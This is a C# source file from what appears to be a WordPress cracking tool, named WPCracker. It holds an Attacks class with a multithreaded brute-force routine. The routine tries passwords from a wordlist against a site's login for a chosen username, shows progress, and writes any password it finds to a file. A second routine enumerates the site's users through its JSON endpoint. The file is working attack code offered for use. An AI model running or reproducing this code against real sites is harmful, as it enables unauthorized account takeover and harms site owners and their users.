using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace WPCracker
{
    class Attacks
    {
        public static void BruteForceAttack(string uri, string username, string wordlistPath, int maxThreads, int batchCount, string outFilePath)
        {
            var login = new Login(new Uri(uri));
            using var sr = new StreamReader(wordlistPath);

            Console.CursorVisible = false;

            var (top, left) = (Console.CursorTop, Console.CursorLeft);

            var found = false;
            var watch = System.Diagnostics.Stopwatch.StartNew();

            void Update(decimal percentage, long seconds)
            {
                var remaining = TimeSpan.FromSeconds(seconds);
                Console.SetCursorPosition(left, top);
                Console.WriteLine($"{percentage * 100:0.0000} % ready");
                Console.SetCursorPosition(left, top + 1);
                Console.WriteLine($"{remaining.TotalMinutes:0.0} minutes remaining");
                Console.SetCursorPosition(left, top + 2);
                Console.WriteLine($"{watch.Elapsed.TotalMinutes:0.0} minutes elapsed");
            }

            while (!sr.EndOfStream)
            {
                var buffer = new List<string>();
                for (var i = 0; i < batchCount; i++)
                {
                    buffer.Add(sr.ReadLine());
                }

                var percentage = (decimal)sr.BaseStream.Position / sr.BaseStream.Length;
                var percentsPerSecond = percentage / (decimal)watch.Elapsed.TotalSeconds;
                var remainingSeconds = (long)((1 - percentage) / percentsPerSecond);
                Update(percentage, remainingSeconds);

                Parallel.ForEach(buffer, new ParallelOptions { MaxDegreeOfParallelism = maxThreads }, password =>
                {
                    try
                    {
                        if (!login.LogInAttemptAsync(username, password).GetAwaiter().GetResult()) return;
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("\nPassword found!");
                        Console.WriteLine($"Username: {username}\nPassword: {password}");
                        Console.ResetColor();
                        found = true;

                        if (!string.IsNullOrEmpty(outFilePath))
                        {
                            var toFile = new SaveResult();

                            toFile.LoginCredentialsToFileAsync(uri, outFilePath, username, password);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.WriteLine(ex.Message);
                        Console.ResetColor();
                    }
                });
                
                if (found)
                    return;
            }

            if (found) return;
            
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"\nPassword for username {username} NOT found!");
        }

        public static async void UserEnum(string uri, string outFilePath)
        {
            var client = new HttpClient();
            var response = await client.GetAsync(uri);
            response.EnsureSuccessStatusCode();
            var responseBody = await response.Content.ReadAsStringAsync();

            var list = JsonConvert.DeserializeObject<List<WpUserInfo>>(responseBody);

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"Found {list.Count} user(s)\n");
            Console.ForegroundColor = ConsoleColor.Yellow;

            var first = true;
            foreach (var t in list)
            {
                Console.WriteLine($"ID:.............{t.Id}");
                Console.WriteLine($"NAME:...........{t.Name}");
                Console.WriteLine($"DESCRIPTION:....{t.Description}");
                Console.WriteLine($"LINK:...........{t.Link}");
                Console.WriteLine($"URL:............{t.Url}");
                Console.WriteLine($"SLUG:...........{t.Slug}\n");

                if (!string.IsNullOrEmpty(outFilePath))
                {
                    var toFile = new SaveResult();
                    toFile.UsersToFileAsync(uri, outFilePath, t, first);
                }
                
                first = false;
            }
            Console.ResetColor();
        }
    }
}
